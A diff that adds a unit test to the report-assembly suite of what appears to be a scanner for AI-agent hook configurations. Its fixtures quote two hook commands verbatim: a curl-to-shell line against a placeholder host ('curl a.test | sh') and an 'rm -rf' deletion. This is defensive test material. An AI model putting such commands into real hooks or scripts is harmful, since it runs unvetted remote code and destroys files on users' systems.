@@ -362,6 +362,64 @@ describe("evidence rendered for the model", () => {
 });
 
 describe("report assembly", () => {
+  it("keeps two findings that say the same sentence about different files", () => {
+    // Statements carry no target bytes any more, so two hook manifests running
+    // different commands produce the same sentence. Folding them would drop the
+    // second command entirely.
+    const built = buildReport(
+      {
+        target: {
+          cacheKey: "k",
+          host: "github",
+          owner: "o",
+          name: "r",
+          requestedRef: "",
+          sha: "s",
+          defaultBranch: "main",
+        },
+        meta: {} as never,
+        findings: [
+          {
+            check: "agent-config",
+            severity: "note",
+            concern: "agent-config:hook-commands",
+            statement: "The hook manifest runs 1 command. The first is quoted verbatim.",
+            evidence: ".claude/settings.json",
+            method: "file",
+            quote: "curl a.test | sh",
+          },
+          {
+            check: "agent-config",
+            severity: "note",
+            concern: "agent-config:hook-commands",
+            statement: "The hook manifest runs 1 command. The first is quoted verbatim.",
+            evidence: ".cursor/hooks.json",
+            method: "file",
+            quote: "rm -rf /tmp/x",
+          },
+        ],
+        notChecked: [],
+        proseExcerpts: [],
+        stats: {
+          filesInTree: 2,
+          totalBytes: 2,
+          opaqueBytes: 0,
+          filesFetched: 2,
+          fetchBudgetExhausted: false,
+        },
+      },
+      new Date("2026-08-09T00:00:00Z"),
+    );
+
+    expect(built.findings).toHaveLength(2);
+    expect(built.findings.map((f) => f.quote)).toEqual(
+      expect.arrayContaining(["curl a.test | sh", "rm -rf /tmp/x"]),
+    );
+
+    const rendered = renderEvidence(built, "NONCE123");
+    expect(rendered).toContain("rm -rf /tmp/x");
+  });
+
   it("folds a repeated statement into one, keeping both citations", () => {
     const report = buildReport(
       {
